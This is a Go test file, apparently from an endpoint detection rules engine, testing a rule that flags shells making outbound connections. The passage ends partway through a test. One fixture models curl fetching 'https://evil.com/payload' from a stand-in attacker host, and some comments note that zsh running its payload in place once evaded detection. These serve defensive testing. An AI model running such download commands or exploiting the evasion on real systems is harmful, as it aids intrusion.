package catalog

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fleetdm/edr/server/rules/api"
)

// Tests for shell_network_connect, the outbound-connection arm split out of suspicious_exec by issue #776.
//
// These moved here wholesale rather than being rewritten: the arm's behaviour is unchanged by the split, so a test that passed
// against the merged rule and passes against this one is the evidence that the split preserved it. Only the rule under test and
// the test names changed. Helpers stay in suspicious_exec_test.go; both files are package catalog.

func TestShellNetworkConnectDetectsShellWithOutboundConnection(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// python3 (PID 50) → /bin/sh (PID 100) → curl (PID 200) which makes an outbound connection.
	// curl's path is /usr/bin/curl (not suspicious), but the outbound network connection triggers detection.
	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","curl ..."],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","https://evil.com/payload"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":"198.51.100.42","remote_port":443,"remote_hostname":"evil.com"}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &ShellNetworkConnect{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1)

	f := findings[0]
	assert.Equal(t, "shell_network_connect", f.RuleID)
	assert.Equal(t, "high", f.Severity)
	assert.Equal(t, "Shell outbound connection", f.Title)
	assert.Contains(t, f.Description, "198.51.100.42:443")
	assert.Contains(t, f.EventIDs, "exec-sh")
	assert.Contains(t, f.EventIDs, "net-curl")
}

// TestShellNetworkConnect_ParentAllowlistGlobMatching covers the version-agnostic parent exclusion: a glob entry suppresses a
// version-stamped developer-tool parent (the issue #391 noise), while a literal entry keeps exact-match semantics. The glob
// matching itself lives in the resolver (api.GlobMatch / api.MatchExclusionValue) and is unit-tested in the rules/api package;
// this test pins the rule -> resolver wiring end to end.
//
// The markers moved here with the test (issue #776). They were left behind in suspicious_exec_test.go, where they dangled at the
// end of the file under a comment describing a function that was no longer there. spectrace stayed green throughout, because it
// checks that a marker RESOLVES and not that it is attached to anything: an orphaned marker is invisible to it.
//
// spec:server-detection-rules-engine/version-agnostic-parent-allowlist-matching/a-glob-allowlist-entry-suppresses-a-version-stamped-parent
// spec:server-detection-rules-engine/version-agnostic-parent-allowlist-matching/a-literal-allowlist-entry-still-matches-exactly
func TestShellNetworkConnect_ParentAllowlistGlobMatching(t *testing.T) {
	t.Parallel()

	// claude (version-stamped path) -> /bin/sh -> curl -> outbound to a public address: the dominant benign shape on the pilot host.
	makeEvents := func(parentPath string) []api.Event {
		return []api.Event{
			{EventID: "fork-parent", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
			{EventID: "exec-parent", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"` + parentPath + `","args":["claude"],"uid":501,"gid":20}`)},
			{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
			{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","curl ..."],"uid":501,"gid":20}`)},
			{EventID: "fork-curl", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
			{EventID: "exec-curl", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","https://github.com"],"uid":501,"gid":20}`)},
			{EventID: "net-curl", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
				Payload: json.RawMessage(`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":"140.82.112.3","remote_port":443,"remote_hostname":"github.com"}`)},
		}
	}

	const versionStampedParent = "/Users/dev/.local/share/claude/versions/2.1.178/claude"

	t.Run("glob entry suppresses a version-stamped parent", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents(versionStampedParent)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &ShellNetworkConnect{Exclusions: &fakeExclusions{entries: []fakeExcl{
			{ruleID: "shell_network_connect", matchType: api.ExclusionMatchParentPathGlob, value: "*/claude/versions/*"},
		}}}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "version-stamped parent must match the glob exclusion entry")
	})

	t.Run("glob entry does not suppress a non-matching parent", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents(versionStampedParent)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		// A glob for a DIFFERENT tool must not suppress the claude chain.
		rule := &ShellNetworkConnect{Exclusions: &fakeExclusions{entries: []fakeExcl{
			{ruleID: "shell_network_connect", matchType: api.ExclusionMatchParentPathGlob, value: "*/lefthook_*"},
		}}}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "non-matching glob must leave the rule firing")
		assert.Contains(t, findings[0].Description, versionStampedParent)
	})

	t.Run("literal entry still matches exactly", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		parent := "/usr/libexec/sshd-session"
		events := makeEvents(parent)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &ShellNetworkConnect{Exclusions: &fakeExclusions{entries: []fakeExcl{
			{ruleID: "shell_network_connect", matchType: api.ExclusionMatchParentPathGlob, value: parent},
		}}}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "literal entry must match the parent path exactly")
	})
}

// TestShellNetworkConnect_LocalResolverDNSDeNoising covers this rule's DNS de-noising: an outbound DNS lookup to the host's
// local-resolver-class address (the Tailscale MagicDNS case from issue #391) is not a triggering connection, while a DNS lookup to a
// publicly routable resolver still fires.
//
// spec:server-detection-rules-engine/local-resolver-dns-suppression-for-the-network-arm/outbound-dns-to-a-local-resolver-does-not-count-as-a-network-connection
// spec:server-detection-rules-engine/local-resolver-dns-suppression-for-the-network-arm/outbound-dns-to-a-public-resolver-still-fires
func TestShellNetworkConnect_LocalResolverDNSDeNoising(t *testing.T) {
	t.Parallel()

	// python3 -> /bin/sh -> dig -> outbound UDP :53. The destination address is the only thing that varies between subtests.
	makeEvents := func(remoteAddress string, remotePort int) []api.Event {
		netPayload := fmt.Sprintf(
			`{"pid":200,"path":"/usr/bin/dig","uid":501,"protocol":"udp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":%q,"remote_port":%d}`,
			remoteAddress, remotePort,
		)
		return []api.Event{
			{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
			{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
			{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
			{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","dig ..."],"uid":501,"gid":20}`)},
			{EventID: "fork-dig", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
			{EventID: "exec-dig", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/dig","args":["dig","github.com"],"uid":501,"gid":20}`)},
			{EventID: "net-dig", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
				Payload: json.RawMessage(netPayload)},
		}
	}

	t.Run("outbound DNS to a local resolver does not count as a network connection", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// 100.100.100.100 is Tailscale MagicDNS, in the CGNAT 100.64.0.0/10 range.
		events := makeEvents("100.100.100.100", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &ShellNetworkConnect{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "DNS to the local resolver must not trigger the network arm")
	})

	t.Run("outbound DNS to a private RFC1918 resolver does not count", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents("192.168.1.1", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &ShellNetworkConnect{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "DNS to a private-range resolver must not trigger the network arm")
	})

	t.Run("outbound DNS to a public resolver still fires", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// 8.8.8.8 is a publicly routable resolver: DNS tunnelling to an external resolver must still surface.
		events := makeEvents("8.8.8.8", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &ShellNetworkConnect{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "DNS to a public resolver must still trigger the network arm")
		assert.Equal(t, "Shell outbound connection", findings[0].Title)
		assert.Contains(t, findings[0].Description, "8.8.8.8:53")
	})

	t.Run("outbound to a local-range address on a non-DNS port still fires", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// The de-noising is DNS-only: a connection to a private address on :443 is not name resolution and must still fire.
		events := makeEvents("192.168.1.10", 443)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &ShellNetworkConnect{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "non-DNS port must not be de-noised even to a private address")
	})

	t.Run("outbound DNS to a loopback resolver does not count", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents("127.0.0.1", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &ShellNetworkConnect{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "DNS to a loopback resolver must not trigger the network arm")
	})

	t.Run("outbound DNS to a zoned IPv6 link-local resolver does not count", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// Scoped IPv6 literal with a zone suffix, exactly as the agent emits for mDNS on :53 (present in the demo corpus).
		// net.ParseIP rejects the zone; netip.ParseAddr accepts it, so the de-noiser must still classify it as local.
		events := makeEvents("fe80::842f:57ff:fe06:1564%en0", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &ShellNetworkConnect{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "zoned IPv6 link-local DNS must be de-noised")
	})

	t.Run("outbound DNS to an unparseable remote address still fires", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// A remote_address that is not an IP literal cannot be classified as local-resolver-class, so the rule still fires.
		events := makeEvents("resolver.example.invalid", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &ShellNetworkConnect{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "an unparseable remote address must not be de-noised")
	})
}

// A shell that execs its payload IN PLACE leaves no shell in the connecting process's ancestry: the re-exec closed the shell's
// generation at that same PID, so the PPID walk steps over it and returns the interactive login shell above, which fails the window.
// The network arm therefore has to consult the PID's own exec chain, exactly as the exec arm does (issue #713).
//
// Which shell the attacker picked decided whether the payload was seen at all. Measured on macOS 26.6.1, zsh replaces itself with the
// payload while bash and sh fork it, so the zsh form of an identical command was invisible and the bash form was detected.
// spec:server-detection-rules-engine/network-arm-resolves-a-shell-that-exec-d-its-payload-in-place/a-shell-execs-its-payload-in-place-and-the-payload-connects-out
// spec:server-detection-rules-engine/network-arm-resolves-a-shell-that-exec-d-its-payload-in-place/the-shell-on-the-exec-chain-is-outside-the-window
// spec:server-detection-rules-engine/network-arm-resolves-a-shell-that-exec-d-its-payload-in-place/a-re-exec-with-no-shell-on-the-chain-does-not-fire
func TestShellNetworkConnectDetectsShellThatExecsPayloadInPlace(t *testing.T) {
	t.Parallel()

	// An interactive login shell exec'd long before the run, so it is the nearest shell in the PPID chain and is far outside the
	// window. It is what the walk used to return, and what made the miss look like "no shell found".
	const (
		loginZshExec = int64(650)
		pyExec       = int64(1_000_000_000_100)
		shellExec    = int64(1_000_000_001_100)
		payloadExec  = int64(1_000_000_002_000)
		flowAt       = int64(1_000_000_002_500)
	)
	base := []api.Event{
		{EventID: "fork-login", HostID: "h", TimestampNs: 500, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":10,"parent_pid":1}`)},
		{EventID: "exec-login", HostID: "h", TimestampNs: 550, EventType: "exec",
			Payload: json.RawMessage(`{"pid":10,"ppid":1,"path":"/usr/bin/login","args":["login"],"uid":0,"gid":0}`)},
		{EventID: "fork-zsh", HostID: "h", TimestampNs: 600, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":20,"parent_pid":10}`)},
		{EventID: "exec-zsh", HostID: "h", TimestampNs: loginZshExec, EventType: "exec",
			Payload: json.RawMessage(`{"pid":20,"ppid":10,"path":"/bin/zsh","args":["-zsh"],"uid":501,"gid":20}`)},
		{EventID: "fork-py", HostID: "h", TimestampNs: 1_000_000_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":20}`)},
		{EventID: "exec-py", HostID: "h", TimestampNs: pyExec, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":20,"path":"/usr/bin/python3","args":["python3","-c","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-stage", HostID: "h", TimestampNs: 1_000_000_001_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
	}

	execEvt := func(id string, ts int64, pid, ppid int, path string) api.Event {
		return api.Event{EventID: id, HostID: "h", TimestampNs: ts, EventType: "exec",
			Payload: json.RawMessage(fmt.Sprintf(`{"pid":%d,"ppid":%d,"path":%q,"args":[%q],"uid":501,"gid":20}`, pid, ppid, path, path))}
	}
	flowEvt := func(ts int64, pid int) api.Event {
		return api.Event{EventID: "net-payload", HostID: "h", TimestampNs: ts, EventType: "network_connect",
			Payload: json.RawMessage(fmt.Sprintf(
				`{"pid":%d,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",`+
					`"remote_address":"198.51.100.42","remote_port":443}`, pid))}
	}

	cases := []struct {
		name      string
		stage     []api.Event
		flow      api.Event
		wantShell string // empty means no finding
	}{
		{
			// The reported miss. zsh execs curl at its own PID, so nothing in curl's ancestry is a shell.
			name: "zsh execs the payload in place",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/bin/zsh"),
				execEvt("exec-payload", payloadExec, 100, 50, "/usr/bin/curl"),
			},
			flow:      flowEvt(flowAt, 100),
			wantShell: "/bin/zsh",
		},
		{
			name: "bash execs the payload in place",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/bin/bash"),
				execEvt("exec-payload", payloadExec, 100, 50, "/usr/bin/curl"),
			},
			flow:      flowEvt(flowAt, 100),
			wantShell: "/bin/bash",
		},
		{
			// The shape that already worked, kept alongside so a regression in either is visible in one run.
			name: "shell forks the payload",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/bin/bash"),
				{EventID: "fork-payload", HostID: "h", TimestampNs: payloadExec - 100, EventType: "fork",
					Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
				execEvt("exec-payload", payloadExec, 200, 100, "/usr/bin/curl"),
			},
			flow:      flowEvt(flowAt, 200),
			wantShell: "/bin/bash",
		},
		{
			// The chain is consulted, but the shell on it is stale, so the window still governs. Without this the new arm would be
			// a way around the 30-second bound rather than a way to see through a re-exec.
			name: "the shell on the chain is outside the window",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/bin/zsh"),
				execEvt("exec-payload", payloadExec, 100, 50, "/usr/bin/curl"),
			},
			flow:      flowEvt(shellExec+40_000_000_000, 100),
			wantShell: "",
		},
		{
			// A re-exec with no shell anywhere on the chain must stay silent: the arm looks for a shell, not for any re-exec.
			name: "a non-shell re-execs into another non-shell",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/usr/bin/perl"),
				execEvt("exec-payload", payloadExec, 100, 50, "/usr/bin/curl"),
			},
			flow:      flowEvt(flowAt, 100),
			wantShell: "",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			s := openCatalogStore(t)
			ctx := t.Context()
			events := append(append([]api.Event{}, base...), tc.stage...)
			events = append(events, tc.flow)
			require.NoError(t, s.InsertEvents(ctx, events))
			materialize(t, s, events)

			findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
			require.NoError(t, err)
			if tc.wantShell == "" {
				require.Empty(t, findings)
				return
			}
			require.Len(t, findings, 1)
			assert.Contains(t, findings[0].Description, tc.wantShell, "the finding names the shell that ran the payload")
			assert.Contains(t, findings[0].Description, "198.51.100.42:443")
			assert.Contains(t, findings[0].EventIDs, "net-payload")
		})
	}
}

// Shell-to-shell layering is not the boundary this rule fires on, and that holds for a shell found on the exec chain exactly as it
// does for one found in the PPID chain: an interactive shell that forks a shell which then execs the payload in place is a user
// running a command, not a non-shell process reaching for one.
func TestShellNetworkConnectSkipsShellToShellOnTheExecChain(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// login → zsh (interactive, PID 20) → bash (PID 100) → bash execs curl at its own PID → outbound.
	events := []api.Event{
		{EventID: "fork-login", HostID: "h2", TimestampNs: 500, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":10,"parent_pid":1}`)},
		{EventID: "exec-login", HostID: "h2", TimestampNs: 550, EventType: "exec",
			Payload: json.RawMessage(`{"pid":10,"ppid":1,"path":"/usr/bin/login","args":["login"],"uid":0,"gid":0}`)},
		{EventID: "fork-zsh", HostID: "h2", TimestampNs: 600, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":20,"parent_pid":10}`)},
		{EventID: "exec-zsh", HostID: "h2", TimestampNs: 650, EventType: "exec",
			Payload: json.RawMessage(`{"pid":20,"ppid":10,"path":"/bin/zsh","args":["-zsh"],"uid":501,"gid":20}`)},
		{EventID: "fork-bash", HostID: "h2", TimestampNs: 1_000_000_001_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":20}`)},
		{EventID: "exec-bash", HostID: "h2", TimestampNs: 1_000_000_001_100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":20,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "exec-curl", HostID: "h2", TimestampNs: 1_000_000_002_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":20,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "h2", TimestampNs: 1_000_000_002_500, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":100,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings, "the shell on the chain is parented by another shell, so this is layering rather than the rule's shape")
}

// A flow whose process has not been materialised yields nothing rather than an error: unlike dns_c2_beacon, this rule does not treat
// the miss as retryable, and the arm must not fire on a chain it cannot anchor to a connecting process.
func TestShellNetworkConnectSkipsUnmaterialisedFlowProcess(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	events := []api.Event{
		{EventID: "net-orphan", HostID: "h3", TimestampNs: 1_000_000_002_500, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":4242,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings)
}

// A store failure while walking the exec chain must surface rather than read as "no shell here", which would turn a transient
// database error into a silent detection miss of exactly the payload class the chain walk exists to catch.
func TestShellNetworkConnectPropagatesExecChainError(t *testing.T) {
	t.Parallel()
	ctx := t.Context()
	wantErr := errors.New("exec chain unavailable")

	events := []api.Event{
		{EventID: "net-curl", HostID: "h4", TimestampNs: 1_000_000_002_500, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":100,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	gr := &execChainErrReader{stubBlockGraphReader: &stubBlockGraphReader{exists: true, procID: 7}, chainErr: wantErr}
	_, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, gr)
	require.ErrorIs(t, err, wantErr)
}

// execChainErrReader resolves processes normally but fails the exec-chain walk, which is the one dependency the network arm's second
// stage adds. It embeds the package's existing stub rather than restating the whole GraphReader surface.
type execChainErrReader struct {
	*stubBlockGraphReader
	chainErr error
}

func (r *execChainErrReader) GetExecChain(_ context.Context, _ api.Process) ([]api.Process, error) {
	return nil, r.chainErr
}

// `zsh -c 'bash -c "curl ..."'` puts TWO shells on one PID's exec chain, both having exec'd in place. The shell that ran the payload
// is the newest one, and GetExecChain returns the chain oldest-first, so walking it forward hands back the stalest shell. Here the
// outer zsh is outside the window and the inner bash is inside it, so getting the direction wrong does not merely misattribute the
// finding, it drops the alert.
func TestShellNetworkConnectPrefersTheNewestShellOnTheExecChain(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	const flowAt = int64(1_000_000_000_000)
	events := []api.Event{
		{EventID: "fork-py", HostID: "h5", TimestampNs: flowAt - 60_000_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "h5", TimestampNs: flowAt - 59_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-stage", HostID: "h5", TimestampNs: flowAt - 45_000_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		// The outer shell, 40s before the flow, so outside the 30s window.
		{EventID: "exec-zsh", HostID: "h5", TimestampNs: flowAt - 40_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/zsh","args":["zsh","-c","bash -c curl"],"uid":501,"gid":20}`)},
		// The inner shell replaces it in place, 10s before the flow, so inside the window.
		{EventID: "exec-bash", HostID: "h5", TimestampNs: flowAt - 10_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "exec-curl", HostID: "h5", TimestampNs: flowAt - 1_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "h5", TimestampNs: flowAt, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":100,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1, "the newest shell on the chain is inside the window, so the alert must be raised")
	assert.Contains(t, findings[0].Description, "/bin/bash", "the shell that ran the payload is the newest on the chain, not the first")
}

// A shell on the chain whose own parent is not in the graph yet is incomplete ancestry, and the rule defers rather than firing. The
// finding would otherwise name an "(unknown)" parent, and an operator's parent exclusion cannot suppress a parent that was never
// resolved, so a rule they had deliberately configured would be bypassed. The PPID walk defers on the same condition.
func TestShellNetworkConnectDefersWhenTheChainShellsParentIsMissing(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	const flowAt = int64(1_000_000_000_000)
	// PID 100 execs bash with no fork and a parent that never appears in the graph, then replaces itself with curl.
	events := []api.Event{
		{EventID: "exec-bash", HostID: "h6", TimestampNs: flowAt - 10_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":999,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "exec-curl", HostID: "h6", TimestampNs: flowAt - 1_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":999,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "h6", TimestampNs: flowAt, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":100,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&ShellNetworkConnect{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings, "ancestry is incomplete, so the rule defers rather than firing on an unresolvable parent")
}

// The reported #710 failure, reproduced at the timestamps that were actually measured: the flow lands 700ms BEFORE the recorded exec
// of the shell that opened it, because the agent stamped the exec when its handler finished rather than when the kernel reported it.
//
// Two separate things then drop the finding, and both have to give. The ancestor lookups bracket on fork_time_ns <= the flow's
// instant, so a late-stamped shell resolves to no row at all; and shellWithinWindow's lower bound asks the trigger to come after the
// shell, which a late stamp inverts. A trigger cannot causally precede the shell that produced it, so a small negative delta is a
// late stamp rather than evidence of no relationship.
// spec:server-detection-rules-engine/rules-tolerate-a-process-stamped-after-an-event-that-followed-it/a-shell-is-recorded-as-exec-ing-after-the-connection-it-opened
func TestShellNetworkConnectToleratesAProcessStampedAfterItsOwnFlow(t *testing.T) {
	t.Parallel()

	const base = int64(1_000_000_000_000)
	const flowAt = base + 1_000_000_000 // the network extension's stamp, which is the accurate one
	// Everything from Endpoint Security lands late, which is what the handler-time stamping produced.
	const bashForkAt = base + 1_690_000_000
	const bashExecAt = base + 1_700_000_000 // 700ms AFTER the flow it produced, the measured delta

	events := []api.Event{
		{EventID: "fork-py", HostID: "h7", TimestampNs: base, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "h7", TimestampNs: base + 100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-bash", HostID: "h7", TimestampNs: bashForkAt, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-bash", HostID: "h7", TimestampNs: bashExecAt, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "h7", TimestampNs: bashExecAt + 2_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
